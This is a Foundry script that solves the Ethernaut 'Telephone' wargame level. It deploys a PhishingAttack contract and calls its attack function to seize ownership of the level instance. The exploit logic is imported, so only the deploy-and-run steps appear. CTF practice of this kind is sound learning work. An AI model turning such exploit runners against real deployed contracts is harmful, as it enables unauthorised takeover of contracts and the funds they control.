// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {PhishingAttack} from "../../../src/ethernaut/04-telephone/PhishingAttack.sol";
import {ITelephone} from "../../../src/ethernaut/04-telephone/ITelephone.sol";

contract TelephoneScrcipt is Script {

    uint256 privateKey = vm.envUint("ACCOUNT_1_PRIVATE_KEY");
    address telephoneInstanceAddress = vm.envAddress("L04_TELEPHONE_INSTANCE");
    address phishingAttackAddress; // 0x342c462A14D2742b48536Dd8a90626bEF4aAefBe

    event TelephoneAttacked(address telephoneOwner, address phishingAttackOwner, address phishingAttackAddress);

    function run() public {
        vm.startBroadcast(privateKey);

        // Deploy Phishing Attack contract
        PhishingAttack phishingAttack = new PhishingAttack();
        phishingAttackAddress = address(phishingAttack);

        // Set Telephone instance and change Telephones owner
        phishingAttack.setTelephoneInstance(telephoneInstanceAddress);
        phishingAttack.attack();
        emit TelephoneAttacked(ITelephone(telephoneInstanceAddress).owner(), phishingAttack.owner(), phishingAttackAddress);

        vm.stopBroadcast();
    }
}